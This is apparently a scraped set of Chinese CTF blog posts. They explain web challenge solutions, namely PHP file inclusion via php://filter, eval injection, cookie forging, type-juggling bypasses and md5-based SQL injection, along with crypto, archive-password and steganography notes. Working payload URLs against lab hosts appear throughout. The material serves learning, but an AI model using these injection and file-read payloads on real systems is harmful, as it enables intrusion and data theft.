vim不正常退出会产生一个xxx.xxx.swp文件 就是当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。 需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。 例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推 在浏览器输入的时候最前面一定要加一个. 当年惨痛的教训 了解这个知识点就可以解题了 题目是一个输入框 没啥想的 抓包看看 看到响应里的editor为vim 弹出一个窗口 提示 step2 的下一步地址 那就把地址输进去啊 但是发现step2的页面会马上自动跳转回step1 还得抓包 看到了submit.php 结合上面 很明显了 输入 .submit.php.swp 看到 代码审计 可以看出需要两个参数 email和token emailAddress在step2里可以看到 token初始化为0，但if语句中要让他长度为10，可以置为0000000000 所以构造submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 注意这里用的是submit.php file 远程文件包含漏洞发现链接http://120.24.86.145:8005/post/index.php?file=show.php 发现File参数 想到文件包含漏洞 故尝试读取php源码 并且题目提示flag在index里 故读取index.php PAYLOAD:http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php利用base64可以进行不可打印字符的读取 拿到base64加密的源码 再进行解密 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 看到了flag 本地包含题目代码为 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 由Request函数，可以想到文件包含，这里hello是可控的，那么，就可以构造包含语句 分析1.eval(php代码) 2.php代码=var_dump($a) 3.$a=@$_request[‘hello’] 4.$_request[‘hello’]=?hello=此处是你的输入文本 简单地说，你输入的所有内容最终会被包含在var_dump()里然后被eval解析。 所以这里你可以使用php函数，你使用函数读flag.php文件到$a，然后var_dump()输出。 或者从结构上做这道题，假如$a=);xxxxxx，那么eval这一行的内容就是：eval(“var_dump();xxxxxxxxx);”); 这里的xxxxxxx就可以是任意命令，比如是 );show_source(‘flag.php’);var_dump( 然后eval这一行就如下： eval(“var_dump();show_source(‘flag.php’);var_dump($a);”); 类似于一个字符串注入 当然 可改进为 ?hello=);show_source(‘flag.php’);// 即 eval(“var_dump();show_source(‘flag.php’);//);”); eval函数中，”” 内部为代码，//只在代码中起作用，相当于只注释了）； 最后贴一篇文件包含的文章http://www.2cto.com/article/201304/204158.html 最后的最后 又看到了两种方法 ?hello=file(“flag.php”) (好吧这种方法感觉比较奇葩) 还有一种 构造出文件包含 http://120.24.86.145:8003/?hello=);include $_POST[a];//a=php://filter/read=convert.base64-encode/resource=flag.php 读文件 cookie欺骗感觉挺好的一道题 学到了不少 题目 url http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= 至于题目页面显示的是一串很长的字符 后来发现没什么用 重点放在url上 filename 后的文件名是经过base64加密的 解密得到keys.txt 再测试line代表行数 结合起来就是显示出名为filename的文件的%d行代码 但是传文件名时要进行base64加密 那么尝试读取index.php 把其加密 得到aW5kZXgucGhw 但是我们不知道具体行数 这里应该写一个python脚本的 但是目前太菜了不会(捂脸) 好吧还是贴一个别人的脚本 1234567891011#coding:utf-8import requests,base64import rehtml=''url='http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw's=requests.Session()for i in range(100): content=s.get(url%i) if content.text=='': break html+=content.text 我就用burp的爆破方法 从行数为0试到100 再按长度排下序一行一行看(你把line参数删了也没用 默认只读出了第零行) 在按照最左侧序号从小到大排序 把每一行贴在一起得到 12345678910111213141516171819&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 就是加上一个cookie，让keys.php加入文件列表中，然后申请读取keys.php(注意是keys.php不是txt) 抓包 repeater 记得把keys.php base64加密 这里题目比较友好 line默认0行就读出来了 不然还得遍历 各种源码泄露https://www.secpulse.com/archives/55286.html 这里总结的挺全 遇到的是 .DS_Store文件泄漏 找到相应工具后利用拿到源码 flag就躺在里面","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"include","slug":"include","permalink":"http://Merl1ng.com/tags/include/"},{"name":"vim","slug":"vim","permalink":"http://Merl1ng.com/tags/vim/"},{"name":"cookie","slug":"cookie","permalink":"http://Merl1ng.com/tags/cookie/"}]},{"title":"php绕过补充","slug":"php绕过补充","date":"2017-09-01T04:27:22.000Z","updated":"2017-09-01T05:23:55.077Z","comments":true,"path":"2017/09/01/php绕过补充/","link":"","permalink":"http://Merl1ng.com/2017/09/01/php绕过补充/","excerpt":"在做题的过程中又遇到了一些 作为补充记录","text":"在做题的过程中又遇到了一些 作为补充记录 sha1()函数12345678910111213141516171819202122232425262728293031323334[php] view plain copy print?&lt;html&gt; &lt;head&gt; &lt;title&gt;level1&lt;/title&gt; &lt;link rel='stylesheet' href='style.css' type='text/css'&gt; &lt;/head&gt; &lt;body&gt; &lt;?php require 'flag.php'; if (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) print 'Your password can not be your name.'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else print '&lt;p class=\"alert\"&gt;Invalid password.&lt;/p&gt;'; &#125; ?&gt; &lt;section class=\"login\"&gt; &lt;div class=\"title\"&gt; &lt;a href=\"./index.txt\"&gt;Level 1&lt;/a&gt; &lt;/div&gt; &lt;form method=\"get\"&gt; &lt;input type=\"text\" required name=\"name\" placeholder=\"Name\"/&gt;&lt;br/&gt; &lt;input type=\"text\" required name=\"password\" placeholder=\"Password\" /&gt;&lt;br/&gt; &lt;input type=\"submit\"/&gt; &lt;/form&gt; &lt;/section&gt; &lt;/body&gt; &lt;/html&gt; 分析代码逻辑，发现GET了两个字段name和password，获得flag要求的条件是：name != password &amp; sha1(name) == sha1(password)，乍看起来这是不可能的，其实可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如：?name[]=a&amp;password[]=b，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，if 条件成立，获得flag md5()函数同样可以 ereg()和strpos()原版123456789101112&lt;?php require 'flag.php'; if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; &#125; ?&gt; 数组 ereg是只能处理字符串的，所以，按照原理，我们将password构造一个arr[]，传入之后，ereg是返回NULL的，===判断NULL和 FALSE，是不相等的，所以可以进入第二个判断，而strpos处理数组，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成 立，拿到flag 加强版1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; ereg判断是不是字母数字类型 判断是不是长度9999999 判断是不是有“-” 因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造1e8即100000000 &gt; 9999999 于是乎构造password=1e8%00-,成功得到答案 这里同上面构造 password[]=xxx也能过 十六进制与数字这个之前其实记录过 但还是再温习一下 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag = 'flag&#123;test&#125;'; $one = ord('1'); $nine = ord('9'); $number = '3735929054'; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return \"flase\"; &#125; &#125; if($number == $temp) return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，0x开 头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de，在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag。 数字运算（一）123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (\"POST\" == $_SERVER['REQUEST_METHOD']) &#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) &#123; echo 'Wrong Format'; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break; if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; &#125; &#125;?&gt; 这里的意思就是：接收post参数password的值，必须满足12位以上字符，必须是非空格非TAB之外的内容，然后就是你的password要有大小写数字，字符内容，而且匹配到的次数要大于6次，最后才是这里的考点： 12if (\"42\" == $password) echo $flag; else echo 'Wrong password'; 最后的答案就是：42.00e+00000000000当然也可以这样：420.000000000e-1 42.00e+0000000000，10的00000次方。。等于42.000000…. 结果其实就是42 数字运算（二）12345678&lt;?php$flag = \"flag&#123;test&#125;\";$temp = \"1337a\";is_numeric($temp)?die(\"nope\"):NULL; if($temp&gt;1336)&#123; echo $flag;&#125; ?&gt; s代码中先将变量放到is_numeric函数中判断，如果数字或数字字符串则返回true，否咋返回false。然后一个判断，如果temp大于1336则显示flag。这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag md5()高级用法12345678910111213141516171819202122&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', 'root');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db(\"security\", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// 执行sql$password = $_GET['password'];$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; 这里的sql语句是 1$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\"; 其中md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果后的字符串又单引号之类的字符就可以注入了。比如字符串：ffifdyop md5后，276f722736c95d99e921722cf9ed621c 将其转成字符串的话就是 可以看到起字符串类似于 ‘ or ‘6xxxxx 这样的字符串，其中’or’6是个永真的条件，如果把它放到查询中就可以进行where语句的判断，比如我们在url输入password=ffifdyop就可以看到dump出的数据","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"php代码审计","slug":"php代码审计","date":"2017-08-28T14:00:48.000Z","updated":"2017-10-04T13:18:27.665Z","comments":true,"path":"2017/08/28/php代码审计/","link":"","permalink":"http://Merl1ng.com/2017/08/28/php代码审计/","excerpt":"双url编码绕过","text":"双url编码绕过 12345678910111213141516&lt;?phpif(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 主要涉及两个php函数 eregi 和 urldecode 查了一下 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写 urlencode()函数原理就是首先把中文字符转换为十六进制，然后在每个字符前面加一个标识符% urldecode()函数与urlencode()函数原理相反，用于解码已编码的 URL 字符串，其原理就是把十六进制字符串转换为中文字符 所以这段php代码的大意就是以GET方式获取id 在id里查找有没有hackerDJ 有则不通过 并且要求urldecode解码后的id为hackerDJ 这样直接看上去是矛盾的 但是可以用URL编码绕过 hackerDJ转16进制后为 6861636b6572444a 加上%为 %68%61%63%6b%65%72%44%4a 但是这样 在题目url后输入?id=%68%61%63%6b%65%72%44%4a 会被浏览器直接解码 相当于还是输入了 ?id=hackerDJ 这显然是不行的 又了解到%的16进制但是25 所以我每个前面加上了 %25试了试 结果还是不行 当我输入?id=%25%68%25%61%25%63%25%6b%25%65%25%72%25%44%25%4a 浏览器的回显是 %25h%25a%25c%25k%25e%25r%25D%25J 这里比较奇怪 暂时还没有懂 于是再尝试另外一种方式 看到了一个大佬发的这个 双倍url编码 就是说想打/，一般编码一次是%5c 但攻击者怕这个会被认出来，所以用二次编码，把%本身编码成%25。再和后边拼成%255c。 如果URL解码器有缺陷，只不断重复“从前边开始解析”这个步骤，就会把这个先变回%5c，再变成/，出现循环解析。当然这是错误的。正确的只应该解一步变成%5c 抵抗父级目录回溯攻击，绝对不能依赖字符过滤，你过滤不完的。必须用“鸭子编程法”，先不论如何构造完整路径，再检验是否在有权的操作目录下 要正确进行URL解码，谨记使用PHP等语言提供的内部函数，切勿重复发明轮子 想到了 ?id=%2568%2561%2563%256b%2565%2572%2544%254a 成功拿到flag 变量(这个暂时没有完全理解) 1234567891011121314flag In the variable ! &lt;?php error_reporting(0);include \"flag1.php\"; //包含flag1.php这个文件highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; //正则表达式，匹配字符串，\\w表示字符+数字+下划线，+代表有若干个\\w字符组成 die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; $$args PHP中变量可以当作另一个变量的变量名 例如12345&lt;?php$a='b';$b=\"Boogle\";eval(\"var_dump($$a);\"); //输出 Boogle?&gt; 再看第一句提示： flag In the variable !//flag 在变量中 结合两者，可以想到一个很有意思的变量 $GLOBALS：一个包含了全部变量的全局组合数组 变量的名字就是数组的键 $GLOBALS是由所有已定义全局变量自动形成的数组。变量名就是该数组的索引 payload：?args=GLOBALS 即可爆出所有变量，其中包含flag array(7) { [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_GET&quot;]=&gt; array(1) { [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag{92853051ab894a64f7865cf3c2128b34}&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; } sha1绕过12345678910111213141516171819&lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 以前在博客记录过 sha1函数不能比较数组 会报错都返回 false 导致相等http://blog.merl1ng.cc/2017/09/01/php绕过补充/ 所以利用这个漏洞 注意 get和post方式 php反序列化1234567891011121314151617181920212223242526272829&lt;html&gt; &lt;head&gt; &lt;meta charset=utf8&gt; &lt;title&gt;最安全的管理系统&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;天网管理系统&lt;/h1&gt; &lt;p&gt;安全与你同在&lt;/p&gt; &lt;p&gt;账户:admin 密码:admin&lt;/p&gt; &lt;p&gt;就是这么光明正大的放置用户名和密码,爸爸说我们再也不会忘记密码啦。&lt;/p&gt; &lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;index.php&quot;&gt; &lt;table&gt; &lt;th&gt; &lt;td&gt;大家请放心使用我们的产品。&lt;/td&gt; &lt;/th&gt; &lt;tr&gt; &lt;td&gt;用户名:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;登入系统&quot;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;span style=&quot;color:#ff6666;&quot;&gt;&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;&lt;/span&gt; &lt;/body&gt; &lt;/html&gt; 先是php弱类型 看到注释里面有一个提示，当传入的username值经md5加密后等于0，就会返回某样东西 只需要找到md5值为0exxx（xxx全为数字,共30位）(科学计数法) 传入s878926199a 它的md5 为0e545993274517709034328855841020 得到下一个页面的地址 访问得到 12345678$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???') &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年。 unserialize() 对单一的已序列化的变量进行操作，将其转换回反序列化 PHP 的值 返回的是转换之后的值，可为 integer、float、string、array 或 object 如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE 序列化与反序列化: 把复杂的数据类型压缩到一个字符串中 serialize() 把变量和它们的值编码成文本形式 unserialize() 恢复原先变量 分析 1.我们需要构造序列化的password填入，代码意思是把post提交的password值经过”反序列化”得到一个数组， 要求数组里的user和pass都等于某个值时就打印flag 2.加上代码提示布尔。 3.bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 4.构造password: a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}（a代表array，s代表string，b代表bool，而数字代表个数/长度） 输入即可","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"密码学基础题目","slug":"密码学基础题目","date":"2017-08-25T03:30:02.000Z","updated":"2017-10-24T16:18:17.000Z","comments":true,"path":"2017/08/25/密码学基础题目/","link":"","permalink":"http://Merl1ng.com/2017/08/25/密码学基础题目/","excerpt":"snake所给图片是一只蛇的照片 格式为jpg","text":"snake所给图片是一只蛇的照片 格式为jpg binwalk 发现 rar -e拿到压缩包 这里补一个不用binwalk 分析的方法 winhex打开图片 因为是jpg文件所以文件头是FFD8，文件尾是FFD9 查看它们，发现此图片文件有文件尾FFD9，但不是在最后 则可能有隐写 改为zip或者rar 当然还是binwalk最快… 解压 rar 得到 key 和 cipher key里base64 解密得到明文：What is Nicki Minaj’s favorite song that refers to snakes?百度一下，得key:anaconda 当时这里犯了一个错误 原因是密码学的了解太少 对 cipher 这个单词不敏感 以为这玩意没用 而用 蛇的图片 作为被加密的文件用key去解密 事实上 cipher 才是密文 那么现在我们有了密文和公钥 其中公钥加密最著名的就是AES 百度之 发现AES加密的一种算法叫做 SERPENT 而这个单词正是蛇的意思 故到相关网站进行解密 拿到flag 最后贴一张昨天打到周榜第一的截图 haha 希尔密码在线代的课本上出现了一堆神秘字母 dloguszijluswogany 而旁边的矩阵是 1 20 1 根据字典序将字母转化为数字(0-25) 设定密钥矩阵(n*n)，将明文转化为r n的矩阵 将明文矩阵与密钥矩阵相乘即可得到密文矩阵(结果模26)，再将其转化为字母即可 原理及代码实现可以看这篇 http://xmwen1.blog.51cto.com/10730069/1751672 d l o g u s z i j 3 11 14 6 20 18 25 8 9l u s w o g a n y 11 20 18 22 14 6 0 13 14 1 2 的逆矩阵为 -1 -20 1 0 1 相乘 取模 再转换成字母 ansi解码有一道web题经过一些步骤来到了一个页面 但是显示404 这里查看源码就能看到 1234567891011&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"white\"&gt;&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&lt;!-- ┼攠數畣整爠煥敵瑳∨灯捲≤┩&gt; --&gt;&lt;/body&gt;&lt;/html&gt; ┼攠數畣整爠煥敵瑳∨灯捲≤┩&gt;有一句注释，熟悉的人就知道是一句话木马 这是ANSI转Unicode而得到的 解密方法 复制到记事本里另存为 编码选上 Unicode 用WinHex等可以查看16进制的软件，直接打开即可 如果想显示正常，把开头的FF FE两个字节删了，再用记事本打开就看到了原理是：Windows平台下默认的Unicode编码为Little Endian的UTF-16，UTF-16就需要通过在文件开头以名为BOM（Byte Order Mark）的字符来表明文件是Big Endian还是Little Endian。BOM为U+FEFF这个字符 ANSI转Unicode工具 a2u4hack.exe 它常用来对一句话木马进行变形 比如这里 http://www.91ri.org/1126.html tips有关密码学加密总结可以看这篇 http://www.360doc.com/content/16/0906/21/27425026_588911412.shtml很多偏门的也涉及到了 U2FsdGVkX1 开头的密文是对称加密 AES / DES ascii码的二进制表示是7位","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"压缩包密码破解","slug":"压缩包密码破解","date":"2017-08-23T14:38:01.000Z","updated":"2017-09-22T15:37:06.298Z","comments":true,"path":"2017/08/23/压缩包密码破解/","link":"","permalink":"http://Merl1ng.com/2017/08/23/压缩包密码破解/","excerpt":"zip已知明文攻击题目为一个加密的压缩包和一个tips.txt文本","text":"zip已知明文攻击题目为一个加密的压缩包和一个tips.txt文本 文本里写着 密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！ 这要暴力破解至少一晚上 winhex 打开 加密压缩包 发现里面也有 tips.txt 文件 故可以采用已知明文攻击 用azpr 注意在Mtf1y@后面还有四个空格…. winrar密码破解题目如下 Tips winrar, password crack, 65h – 71h以下是一段16进制字符串 526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700 key是解压后的txt文件的sha1值(取前8位) 首先复制16进制代码到winhex 发现是 rar 文件 保存 这里只能用winrar解压 (修不修复都行) 用好压等等会直接报错 解压会提示输入密码 结合题目 tips 65h–71h 这里指的是winhex的偏移 (十六进制) 注意这里我的winhex左侧是以十进制的表示的 故对我来说 需要先把64和71转化为16进制 即101–113 如果左侧以十六进制计数 则不需要转换 选中101–113 复制 ascii值即为压缩包密码 剩下把文件拖进 MultiHasher 里就能看到 sha1值 这里 输入65h–71h解压成功据说是破解了winrar的加密 但是也可能是巧合 真实性还有待考证 以下内容最初来自看雪 实例1： 第一步：用winhex将下面数据生成rar格式的文件。 526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700 第二步：在winhex中取65h-71h一段数据ctrl+c后粘贴到密码输入框点确定完成秒破。（实例一） 实例2： 526172211A0700CE997380000D00000000000000395B7A2D7B7D2E2ED417190FDC99688612D2B31773CD93FE082F30D3229C8F77F51B936AD003E65AADF605471FA4ED0E3655748BCC8F5FA5BFDE4651275A2AA306CB7999C579C249C5AF56A0D3744BD7A695586FEF9FB1AB146CA80DED886936DE3AB003EC44215BA8497E4C1A974D45810C8F1277726881548FBAB842BCF9E17B815C116260ADFEB9151DF97C6F93A673629691B767F883950018B7DE7C0D86FFF04A10905E32BD1DB015B709A298DB8D2C42DF23A131F2AD999AA3BB2316F031C5115c179a2f877a41393761683939 选中14h-1bh一段数据ctrl+c后粘贴到密码输入框中后面再加上dch-e3h处的ASCII字符，确定后即秒破了 原理分析： RAR加密的原理，是将UNICODE格式的密码，与随机生成的一个8字节的SALT连在一起，根据它生成AES算法的密钥来进行加密。而加密后的RAR中，除了加密后的原压缩内容之外，文件头结构还保存了这个SALT值用于解密。原则上SALT的生成过程跟用户输入时的密码一点关系都没有，因此它本来不保存关于密码的显式信息，但是我们可以对WINRAR程序进行patch，使SALT跟密码发生直接联系，从而使这个SALT成为潜在的“后门”。由于SALT只有8个字节，所以对于8个字节以内的密码，可以直接保存在SALT中（或者简单的XOR一下或其他，反正可以用很容易的可逆的算法处理）。那么密码超出8字节怎么办？这里分为两种方式处理，分别是实例一和实例二。 实例一应该是利用了把文件头的HEAD_SIZE字段改大，这样文件头多出来的地方（WINRAR读取文件头时是跳过这部分的）就可以保存密码8字节以后的内容。实例一中的65h-6ch内容就是SALT，而6dh-71h就属于把HEAD_SIZE改大之后多出来的部分了。 但是实例一这种方法应用的前提是文件头没加密。如果文件头被加密（这时MAIN_HEAD的HEAD_FLAGS包含0x0080），那么 MAIN_HEAD后面紧跟着的就是SALT（实例二的14h-1bh内容），SALT后面则是被加密的所有内容（包括文件头）。那么怎么把密码8字节以 后部分搞进去？实例二的做法，我猜是因为加密过程是16字节为一组，加密后的内容也应该是16字节的倍数，所以解密时也以16字节为单位读取，当文件内容最后跟着一段小于16字节的数据时，WINRAR解密时直接无视这段数据。于是就可以把密码的后半部分放在文件最 后（但是不能超过16字节），这样用这种方法可以保存不超过23字节的密码。 原文是好几年前的找不到了 贴一篇转载的http://blog.renren.com/share/293299873/3434623501/0","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"隐写工具大法","slug":"隐写工具大法","date":"2017-08-21T10:35:52.000Z","updated":"2017-10-21T15:16:58.762Z","comments":true,"path":"2017/08/21/隐写工具大法/","link":"","permalink":"http://Merl1ng.com/2017/08/21/隐写工具大法/","excerpt":"音频隐写 Mp3stego把所给图片扔binwalk","text":"音频隐写 Mp3stego把所给图片扔binwalk (图片很好看所以贴出来了(￣▽￣))发现zip文件 并且是 mp3 文件 -e 提取解压 得到 music.mp3 和一个txttxt里写这 key simctf 猜测 是密码 利用 Mp3stego 工具 cmder 切换到 Mp3stego文件夹下 把 music.mp3也放进去 然后 把Decode.exe拖到命令行里 输入如图所示 (-X是获取隐藏的东西 -P后面写密码) Brainfuck 和 Braintools题目提示 brainfuck 直接打开 bftools输入bftools.exe decode braincopter doge.jpg –output –out.png (doge.jpg是题目所给图片) 得到 out.png winhex打开看到 brainfuck 字符 去解密网站解密 得到 base64 再解密 拿 flag wbstego同样用来处理lsb 加密过的文件 在使用stegsolve不行时 利用wbstego 可以分离出 (图形界面) xxx._is 文件 outguess题目提示guess -&gt; outguess 隐写 吐槽一下 这个有点冷门 网上的介绍少之又少 找到一个用法但是只能在 linux 下 在linux里cd到outguess目录下sudo ./configure &amp;&amp; make &amp;&amp; make install(不加sudo 会提示权限不够 即使你是root) 这样就可以使用outguess命令了 自己输入个outguess就会显示其用法，看到这么一条-r retrieve message from data 